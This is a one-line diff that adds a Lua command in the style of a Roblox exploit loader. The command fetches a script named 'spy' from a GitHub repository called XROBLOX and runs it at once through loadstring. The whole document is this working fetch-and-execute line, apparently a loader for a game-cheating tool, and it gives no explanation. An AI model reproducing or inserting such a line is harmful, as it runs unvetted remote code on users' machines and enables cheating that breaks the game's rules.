@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/stardev-community/XROBLOX/refs/heads/main/spy"))()
